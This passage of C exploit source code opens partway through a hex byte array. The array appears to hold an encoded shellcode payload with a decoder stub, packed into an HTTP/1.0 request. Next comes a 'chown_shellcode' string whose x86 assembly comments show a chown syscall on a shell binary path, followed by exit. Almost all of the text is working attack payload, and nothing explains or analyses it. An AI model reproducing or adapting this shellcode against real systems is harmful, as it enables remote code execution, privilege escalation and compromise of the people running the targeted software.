0x62, 0x4a, 0x75, 0x4e, 0x6b, 0x5a, 0x75, 0x36, 
0x33, 0x34, 0x42, 0x33, 0x47, 0x48, 0x4e, 0x76, 
0x58, 0x76, 0x6b, 0x30, 0x68, 0x4b, 0x52, 0x55, 
0x37, 0x68, 0x61, 0x79, 0x58, 0x4b, 0x41, 0x54, 
0x67, 0x6c, 0x79, 0x64, 0x79, 0x59, 0x43, 0x41, 
0x43, 0x78, 0x77, 0x66, 0x61, 0x7a, 0x49, 0x77, 
0x55, 0x74, 0x72, 0x34, 0x66, 0x65, 0x6b, 0x6c, 
0x61, 0x32, 0x6d, 0x7a, 0x69, 0x69, 0x31, 0x67, 
0x30, 0x41, 0x36, 0x6f, 0x77, 0x48, 0x37, 0x37, 
0x69, 0x63, 0x53, 0x6d, 0x53, 0x48, 0x31, 0x68, 
0x69, 0xf7, 0x22, 0x09, 0x08, 0xf8, 0xb1, 0x91, 
0x73, 0x41, 0x7e, 0x37, 0x79, 0x1d, 0x7b, 0x04, 
0x7a, 0x42, 0xbb, 0x9f, 0xb4, 0x75, 0x19, 0xc1, 
0xe1, 0x4e, 0x15, 0x77, 0x08, 0xeb, 0x32, 0xe3, 
0x03, 0xd5, 0xb2, 0x72, 0x27, 0xb6, 0x70, 0x23, 
0xd1, 0xe0, 0x24, 0x48, 0x78, 0x3c, 0xfc, 0x96, 
0x99, 0x76, 0x35, 0x9b, 0x42, 0x0c, 0x47, 0xa9, 
0xd6, 0x7f, 0x05, 0xf8, 0xf9, 0x40, 0x14, 0x4f, 
0x93, 0x1d, 0x92, 0x4a, 0xa8, 0x39, 0xd4, 0x71, 
0x04, 0x3f, 0x49, 0x7d, 0x1c, 0x37, 0x91, 0x66, 
0xb5, 0x2c, 0x46, 0xb3, 0x41, 0x2d, 0xb0, 0xbf, 
0x25, 0x90, 0xb1, 0x4b, 0xb7, 0xb9, 0x34, 0xba, 
0xb8, 0x13, 0xfd, 0xbe, 0x88, 0xf5, 0x97, 0x67, 
0x43, 0x98, 0xdb, 0xd3, 0xd9, 0x74, 0x24, 0xf4, 
0x5a, 0x33, 0xc9, 0xb1, 0x13, 0xb8, 0xdb, 0x22, 
0x9c, 0xe3, 0x31, 0x42, 0x17, 0x83, 0xc2, 0x04, 
0x03, 0x99, 0x31, 0x7e, 0x16, 0x2c, 0xed, 0x2d, 
0x9a, 0x1d, 0x7b, 0xd0, 0x76, 0xc7, 0x23, 0x5d, 
0x67, 0xca, 0x54, 0xce, 0x31, 0x64, 0x6b, 0x3c, 
0x41, 0xcd, 0xed, 0x47, 0x19, 0x97, 0x65, 0xc7, 
0x9e, 0x27, 0x77, 0x51, 0xf7, 0x36, 0x2b, 0xde, 
0x61, 0x6b, 0x5a, 0x01, 0xdd, 0xed, 0x0c, 0x93, 
0x4d, 0x78, 0x4d, 0x50, 0xbf, 0xfa, 0xdc, 0x3f, 
0x10, 0xd5, 0x93, 0xd7, 0x06, 0x06, 0x36, 0x41, 
0xb9, 0xd1, 0x55, 0xc3, 0x16, 0x68, 0x78, 0x54, 
0x93, 0xa7, 0xfb, 0x95, 0xa4, 0x20, 0x48, 0x54, 
0x54, 0x50, 0x2f, 0x31, 0x2e, 0x30, 0x0d, 0x0a, 
0x0d, 0x0a };



char *chown_shellcode=
		"\xeb\x13"                    /* jmp    0x8048075 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\xb6"                    /* mov    $0xb6,%al */
		"\x5b"                        /* pop    %ebx */
		"\x31\xc9"                    /* xor    %ecx,%ecx */
		"\x31\xd2"                    /* xor    %edx,%edx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x01"                    /* mov    $0x1,%al */
		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80"                    /* int    $0x80 */
		"\xe8\xe8\xff\xff\xff"        /* call   0x8048062 */
		"\x2f"                        /* das     */
		"\x68\x6f\x6d\x65\x2f"        /* push   $0x2f656d6f */
		"\x67\x75\x6e"                /* addr16 jne 0x80480f1 */
		"\x73\x6c"                    /* jae    0x80480f1 */
		"\x69\x6e\x67\x65\x72\x2f\x73"/* imul   $0x732f7265,0x67(%esi),%ebp */
		"\x68"                        /* .byte 0x68 */
		"\x65"                        /* gs */
		"\x6c"                        /* insb   (%dx),%es		"(%edi) */
		"\x6c";                       /* insb   (%dx),%es		"(%edi) */
#endif
